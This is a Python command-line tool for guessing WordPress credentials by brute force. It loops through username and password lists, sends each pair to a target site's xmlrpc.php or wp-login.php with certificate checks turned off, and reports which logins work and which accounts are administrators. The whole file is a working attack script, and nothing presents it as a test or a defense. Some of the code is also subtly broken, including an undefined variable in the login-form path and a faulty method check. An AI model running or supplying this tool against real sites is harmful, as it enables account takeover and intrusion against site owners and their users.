#!/usr/bin/python3
import requests
import argparse, sys
#import logging
import xml.etree.ElementTree as ET

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
V_CREDS = []

def xmlrpc_api():
    global V_CREDS
    try:
        for username in username_list:
            for index, password in enumerate(password_list, start=1):
                sys.stdout.write(f'\rUsername: %{uname_len}s - Progress: [%{len(str(pw_len))}s/{pw_len}] %{pname_len}s'% (username.strip(), index,password.strip()))
                sys.stdout.flush()             
                data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
                r = s.post(args.url+'/xmlrpc.php', headers=headers, data=data, verify=False)
                msg = f'{username} : {password}'.replace('\n','')
                if 'Incorrect username or password.' not in r.text:
                    tree = ET.ElementTree(ET.fromstring(r.content))
                    root = tree.getroot()
                    role = [elem.text for elem in root.iter('boolean')][0]
                    isadmin = ''
                    if int(role) == 1:
                        isadmin += ' - is Administrator'
                    print(f' <= Valide{isadmin}')
                    V_CREDS.append(msg+isadmin)
                    break
            print('')
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f'[#] Brute Force via Xmlrpc  Failed : {e}')
        exit(-1)

def loginPage():
    global V_CREDS
    try:
        for username in username_list:
            for index, password in enumerate(password_list, start=1):
                sys.stdout.write(f'\rUsername: %{name_len}s - Progress: [%{len(str(pw_len))}s/{pw_len}] {password.strip()}'% (username.strip(), index))
                sys.stdout.flush() 
                data = {
                    'log':username,
                    'pwd':password,
                    'wp-submit':'Login In'
                }
                r = s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
                msg = f'{username} : {password}'.replace('\n','')
                if 'dashboard' in r.text:
                    isadmin = ''
                    if 'plugins.php' in r.text:
                        isadmin = ' - is Administrator'
                    print(f' <= Valide{isadmin}')
                    V_CREDS.append(msg+isadmin)
                    break
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f'Brute Force via Login Page Failed : {e}')
        exit(-1)

def main():
    print("\n| Start Brute Force Script")
    print(f'[?] Load {user_len} Usernames and {pw_len} Passwords')
    if ('x' or 'xmlrpc') in args.methode:
        print('[#] Use Methode: xmlrpc.php')
        r = s.post(args.url+'/xmlrpc.php', headers=headers, verify=False)
        if r.status_code != 200:
            print('XML-RPC services are disabled on this site')
            exit(-1)
        xmlrpc_api()
    else:
        print('Use Methode: Loging Form')
        r = s.post(args.url+'/wp-login.php', headers=headers, verify=False)
        if r.status_code != 200:
            print('Login Page incorrect')   
            exit(-1)
        loginPage()
    if len(V_CREDS):
        print('\n| Findings:')
        for creds in V_CREDS:
            print(creds)
    else:
        print('\n| No Valide Credentials found')
    print('\n| End')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Brute Force Script, find valide login credentials from username or password (-list)')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_password = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str, help='Target WordPress Url')
    group_user.add_argument('-u', '--userlist', type=str, help='List with Usernames')
    group_user.add_argument('-U', '--user', nargs='+', type=str, help='Individual Usernames')
    group_password.add_argument('-p', '--passwordlist', type=str, help='List with Passwords')
    group_password.add_argument('-P', '--password', nargs='+', type=str, help='Individual Passwords')
    parser.add_argument('-m', '--methode', choices=['x','xmlrpc','l','loginpage'], type=str, default='loginpage', help='Choose x=xmlrpc or l=loginpage (=Default)')
    parser.add_argument('-o', '--output', nargs='?', default=None, const='find_creds.out')
    #parser.add_argument('-log', '--level', default=40, type=int, help='Set Logging Level')
    args = parser.parse_args()

    args.url = args.url.rstrip('/')
    #logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)

    s = requests.session()
    username_list = args.user
    if args.userlist:
        f = open(args.userlist,"r")
        username_list = f.readlines()
    password_list = args.password
    if args.passwordlist:
        f = open(args.passwordlist,"r", encoding="ISO-8859-1")
        password_list = f.readlines()

    pw_len = len(password_list)
    user_len = len(username_list)
    uname_len = len(max(username_list, key=len))
    pname_len = len(max(password_list, key=len))

    headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    main()
